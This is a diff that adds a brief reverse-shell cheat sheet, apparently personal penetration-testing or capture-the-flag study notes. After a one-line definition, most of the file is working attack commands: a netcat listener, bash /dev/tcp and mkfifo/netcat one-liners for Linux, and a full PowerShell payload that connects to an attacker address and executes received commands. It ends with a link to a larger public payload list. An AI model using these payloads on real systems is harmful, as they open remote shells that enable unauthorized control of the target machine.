@@ -1,0 +1,21 @@
+===reverse shell===
+A reverse shell is a shell that is made by running code in the target to hit a listener in your own PC
+
+The simplest way to create to create a reverse shell is to run
+
+nc -lvnp {port number to listen to}
+
+
+then run a script that connects to that port, there are many different ones that depend on the environment you will run the code but he most common ones are:
+	linux:
+		bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
+	
+		rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f
+		
+	windows
+		powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+		
+A comprehensive list can be found on the link [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md]
+
+
+
